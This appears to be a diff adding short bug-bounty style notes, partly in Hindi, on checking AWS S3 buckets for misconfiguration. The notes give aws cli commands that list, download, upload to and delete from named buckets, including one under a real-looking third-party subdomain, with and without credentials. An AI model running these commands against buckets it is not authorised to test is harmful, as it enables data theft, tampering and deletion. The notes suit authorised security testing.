@@ -1,0 +1,19 @@
+AWS misconfiguration : 
+                    sabse pehle check whether a domain or subdomain has an bucket or not , 
+                    say media.coinmetro.com is a subdomain, and in between of requests we found it is taking info from s3.eu-west-2.amazonaws.com , now for confirmation of s3 bucket visit media.coinmetro.com.s3.eu-west-2.amazonaws.com if it exist then we found the right target
+                    exploring misconfiguration: ( without aws credentials )
+                         1) try to list all files of bucket by aws cli: aws s3 ls s3://media.coinmetro.com/ --no-sign-request --region eu-west-2
+                         2) try to add file using following command: aws s3 cp file.txt s3://media.coinmetro.com
+                         3) try to delete bucket file : aws s3 rm s3://media.coinmetro.com/file.txt
+                    exploring misconfiguration: ( with aws credentials )
+                         1) try to list all files of bucket by aws cli: aws s3 --profile default ls s3://media.coinmetro.com/ --no-sign-request --region eu-west-2
+                         2) try to add file using following command: aws s3 --profile default cp file.txt s3://media.coinmetro.com
+                         3) try to delete bucket file : aws s3 --profile default rm s3://media.coinmetro.com/file.txt 
+                         
+                         
+                      Special: try to do with or without cred: 
+                                aws s3 sync s3://media.coinmetro.com/ . --no-sign-request --region eu-west-2  
+                                by this we can download all files present inside of buckets 
+                           aws s3 ls s3://artinfo-test2 = > to list the files inside of bucket
+                           aws s3 sync "viraj" s3://artinfo-test2 => to push the content of directory viraj to the s3 bucket
+                           aws s3 rm s3://artinfo-test2/viraj.txt = > to delete file viraj.txt from the bucket
